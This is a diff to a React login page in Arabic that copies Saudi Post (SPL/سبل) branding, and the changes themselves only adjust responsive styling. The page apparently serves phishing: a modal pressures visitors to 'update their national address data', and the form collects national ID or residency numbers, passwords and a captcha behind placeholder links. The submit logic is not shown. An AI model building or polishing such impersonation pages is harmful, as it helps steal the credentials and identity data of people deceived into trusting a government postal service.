@@ -75,29 +75,29 @@ export default function Login() {
   };
 
   return (
-    <div className="min-h-screen bg-gray-100" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
+    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
       {/* Loading Overlay */}
       {isLoading && (
         <div className="fixed inset-0 flex items-center justify-center z-50">
-          <div className="w-16 h-16 border-4 border-[#04ccf0] border-t-transparent rounded-full animate-spin"></div>
+          <div className="w-12 h-12 md:w-16 md:h-16 border-4 border-[#04ccf0] border-t-transparent rounded-full animate-spin"></div>
         </div>
       )}
 
       {/* Message Modal */}
       {showMessage && (
-        <div className="fixed inset-0 flex items-center justify-center z-50">
-          <div className="bg-white rounded-lg p-8 max-w-md mx-4 text-center shadow-lg">
-            <div className="mb-6">
-              <svg className="w-16 h-16 mx-auto text-[#146c84]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <div className="fixed inset-0 flex items-center justify-center z-50 px-4">
+          <div className="bg-white rounded-lg p-6 md:p-8 max-w-md w-full text-center shadow-lg">
+            <div className="mb-4 md:mb-6">
+              <svg className="w-12 h-12 md:w-16 md:h-16 mx-auto text-[#146c84]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
               </svg>
             </div>
-            <p className="text-lg font-bold text-[#143c3c] mb-6">
+            <p className="text-base md:text-lg font-bold text-[#143c3c] mb-4 md:mb-6">
               عليك تحديث بيانات عنوانك الوطني للإستفادة من الخدمات
             </p>
             <button
               onClick={handleContinue}
-              className="px-12 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors"
+              className="w-full md:w-auto px-8 md:px-12 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
             >
               متابعة
             </button>
@@ -112,25 +112,25 @@ export default function Login() {
             {/* Empty space on right */}
             <div></div>
             {/* English on left */}
-            <a href="#" className="text-white text-sm hover:text-gray-300">English</a>
+            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
           </div>
         </div>
       </header>
 
       {/* Line below header */}
-      <div className="h-2 bg-[#146c84]"></div>
+      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>
 
       {/* Logo and Register button below header */}
-      <div className="bg-gray-100 py-4">
+      <div className="bg-gray-100 py-3 md:py-4">
         <div className="container mx-auto px-4">
           <div className="max-w-xl mx-auto flex justify-between items-center">
             {/* Logo on right */}
             <Link to="/">
-              <img src="/images/spl-logo.png" alt="سبل" className="h-14 md:h-16 w-auto" />
+              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
             </Link>
             {/* Register button on left */}
             <Link to="/register">
-              <button className="px-6 py-2 border-2 border-[#146c84] text-[#146c84] bg-white font-medium rounded hover:bg-[#146c84] hover:text-white transition-colors">
+              <button className="px-4 md:px-6 py-1.5 md:py-2 border-2 border-[#146c84] text-[#146c84] bg-white font-medium rounded text-sm md:text-base hover:bg-[#146c84] hover:text-white transition-colors">
                 تسجيل
               </button>
             </Link>
@@ -139,24 +139,24 @@ export default function Login() {
       </div>
 
       {/* Main Content */}
-      <main className="container mx-auto px-4 py-8 md:py-12">
+      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8 lg:py-12">
         <div className="max-w-xl mx-auto">
           {/* White Box Container */}
-          <div className="bg-white rounded-lg shadow-lg p-6 md:p-10">
+          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
             {/* Title */}
-            <h1 className="text-2xl md:text-3xl font-bold text-[#143c3c] text-right mb-6 md:mb-8">
+            <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-right mb-4 md:mb-6 lg:mb-8">
               تسجيل الدخول
             </h1>
 
             {/* Account Type Selection */}
-            <div className="mb-6 md:mb-8">
-              <h2 className="text-lg md:text-xl font-semibold text-gray-800 text-right mb-4 md:mb-6">
+            <div className="mb-4 md:mb-6 lg:mb-8">
+              <h2 className="text-base md:text-lg lg:text-xl font-semibold text-gray-800 text-right mb-3 md:mb-4 lg:mb-6">
                 الرجاء اختيار نوع الحساب
               </h2>
 
-              <div className="space-y-3 md:space-y-4">
+              <div className="space-y-2 md:space-y-3 lg:space-y-4">
                 {/* الأفراد */}
-                <label className="flex items-center gap-2 cursor-pointer">
+                <label className="flex items-center gap-2 cursor-pointer py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -166,7 +166,7 @@ export default function Login() {
                       onChange={(e) => setAccountType(e.target.value)}
                       className="sr-only"
                     />
-                    <div className={`w-5 h-5 rounded-full border-2 ${accountType === "individuals" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
+                    <div className={`w-5 h-5 md:w-5 md:h-5 rounded-full border-2 ${accountType === "individuals" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                       {accountType === "individuals" && (
                         <div className="w-2 h-2 rounded-full bg-white"></div>
                       )}
@@ -176,7 +176,7 @@ export default function Login() {
                 </label>
 
                 {/* الأعمال */}
-                <label className="flex items-center gap-2 cursor-pointer">
+                <label className="flex items-center gap-2 cursor-pointer py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -186,7 +186,7 @@ export default function Login() {
                       onChange={(e) => setAccountType(e.target.value)}
                       className="sr-only"
                     />
-                    <div className={`w-5 h-5 rounded-full border-2 ${accountType === "business" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
+                    <div className={`w-5 h-5 md:w-5 md:h-5 rounded-full border-2 ${accountType === "business" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                       {accountType === "business" && (
                         <div className="w-2 h-2 rounded-full bg-white"></div>
                       )}
@@ -196,7 +196,7 @@ export default function Login() {
                 </label>
 
                 {/* الخدمات الحكومية */}
-                <label className="flex items-center gap-2 cursor-pointer">
+                <label className="flex items-center gap-2 cursor-pointer py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -206,7 +206,7 @@ export default function Login() {
                       onChange={(e) => setAccountType(e.target.value)}
                       className="sr-only"
                     />
-                    <div className={`w-5 h-5 rounded-full border-2 ${accountType === "government" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
+                    <div className={`w-5 h-5 md:w-5 md:h-5 rounded-full border-2 ${accountType === "government" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                       {accountType === "government" && (
                         <div className="w-2 h-2 rounded-full bg-white"></div>
                       )}
@@ -219,12 +219,12 @@ export default function Login() {
 
             {/* Login Form */}
             <form onSubmit={handleSubmit}>
-              <h3 className="text-lg md:text-xl font-semibold text-gray-800 text-right mb-4 md:mb-6">
+              <h3 className="text-base md:text-lg lg:text-xl font-semibold text-gray-800 text-right mb-3 md:mb-4 lg:mb-6">
                 بيانات التسجيل
               </h3>
 
               {/* Username Field */}
-              <div className="mb-4">
+              <div className="mb-3 md:mb-4">
                 <input
                   type="text"
                   placeholder={accountType === "business" ? "اسم المستخدم / رقم الرخصة / السجل التجاري / الرقم الموحد" : accountType === "government" ? "اسم المستخدم" : "اسم المستخدم / رقم الهوية / رقم الإقامة"}
@@ -233,12 +233,12 @@ export default function Login() {
                     const value = e.target.value.replace(/[^a-zA-Z0-9]/g, '');
                     setUsername(value);
                   }}
-                  className="w-full px-4 py-[11px] border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
+                  className="w-full px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                 />
               </div>
 
               {/* Password Field */}
-              <div className="mb-4">
+              <div className="mb-3 md:mb-4">
                 <input
                   type="password"
                   placeholder="كلمة المرور"
@@ -247,53 +247,55 @@ export default function Login() {
                     const value = e.target.value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
                     setPassword(value);
                   }}
-                  className="w-full px-4 py-[11px] border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
+                  className="w-full px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                 />
               </div>
 
               {/* CAPTCHA */}
-              <div className="mb-6 flex items-center gap-3">
-                {/* CAPTCHA Input - Right side in RTL */}
+              <div className="mb-4 md:mb-6 flex flex-col sm:flex-row items-stretch sm:items-center gap-2 md:gap-3">
+                {/* CAPTCHA Input */}
                 <input
                   type="text"
                   placeholder="الرمز المرئي"
                   value={captchaInput}
                   onChange={(e) => setCaptchaInput(e.target.value)}
-                  className="flex-1 px-4 py-[11px] border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
+                  className="flex-1 px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                 />
 
-                {/* CAPTCHA Display - Left side in RTL */}
-                <div className="bg-gray-100 border border-gray-300 rounded-lg px-4 py-[11px] min-w-[100px] text-center">
-                  <span 
-                    className="text-base font-bold text-gray-700 select-none"
-                    style={{ 
-                      fontFamily: "monospace",
-                      letterSpacing: "3px",
-                      textDecoration: "line-through",
-                      fontStyle: "italic"
-                    }}
-                  >
-                    {captchaCode}
-                  </span>
-                </div>
+                <div className="flex items-center gap-2">
+                  {/* CAPTCHA Display */}
+                  <div className="bg-gray-100 border border-gray-300 rounded-lg px-4 py-2.5 md:py-3 min-w-[80px] md:min-w-[100px] text-center flex-1 sm:flex-none">
+                    <span 
+                      className="text-sm md:text-base font-bold text-gray-700 select-none"
+                      style={{ 
+                        fontFamily: "monospace",
+                        letterSpacing: "3px",
+                        textDecoration: "line-through",
+                        fontStyle: "italic"
+                      }}
+                    >
+                      {captchaCode}
+                    </span>
+                  </div>
 
-                {/* Refresh Button - Left side in RTL */}
-                <button
-                  type="button"
-                  onClick={generateCaptcha}
-                  className="bg-gray-100 border border-gray-300 rounded-lg p-[11px] hover:bg-gray-200 transition-colors"
-                >
-                  <svg className="w-5 h-5 md:w-6 md:h-6 text-[#04ccf0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
-                  </svg>
-                </button>
+                  {/* Refresh Button */}
+                  <button
+                    type="button"
+                    onClick={generateCaptcha}
+                    className="bg-gray-100 border border-gray-300 rounded-lg p-2.5 md:p-3 hover:bg-gray-200 transition-colors"
+                  >
+                    <svg className="w-5 h-5 text-[#04ccf0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                    </svg>
+                  </button>
+                </div>
               </div>
 
               {/* Error Messages */}
               {showErrors && formErrors.length > 0 && (
-                <div className="mb-4 p-4 bg-red-50 border border-red-300 rounded-lg">
-                  <p className="text-red-600 font-bold mb-2 text-right">يرجى إكمال الحقول التالية:</p>
-                  <ul className="list-disc list-inside text-red-500 text-sm text-right">
+                <div className="mb-3 md:mb-4 p-3 md:p-4 bg-red-50 border border-red-300 rounded-lg">
+                  <p className="text-red-600 font-bold mb-2 text-right text-sm md:text-base">يرجى إكمال الحقول التالية:</p>
+                  <ul className="list-disc list-inside text-red-500 text-xs md:text-sm text-right">
                     {formErrors.map((error, index) => (
                       <li key={index}>{error}</li>
                     ))}
@@ -305,14 +307,14 @@ export default function Login() {
               <div>
                 <button
                   type="submit"
-                  className="px-12 md:px-16 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
+                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                 >
                   تسجيل الدخول
                 </button>
               </div>
 
               {/* Forgot Links */}
-              <div className="flex flex-col md:flex-row items-start md:items-center gap-4 md:gap-8 mt-6">
+              <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3 md:gap-4 lg:gap-8 mt-4 md:mt-6">
                 <a 
                   href="#" 
                   onClick={handleForgotUsername}
@@ -340,17 +342,17 @@ export default function Login() {
       </main>
 
       {/* Footer */}
-      <footer className="bg-[#143c3c] py-5">
-        <div className="container mx-auto px-4">
-          <div className="flex flex-col md:flex-row items-center justify-between text-white text-sm">
+      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
+        <div className="container mx-auto px-3 md:px-4">
+          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
             {/* Right side - Copyright */}
-            <div className="flex items-center gap-1 mb-2 md:mb-0">
+            <div className="flex items-center gap-1 text-center md:text-right">
               <span>©</span>
               <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
             </div>
             
             {/* Left side - Terms and Privacy */}
-            <div className="flex items-center gap-1">
+            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
               <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
               <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
               <span className="text-gray-300">و</span>
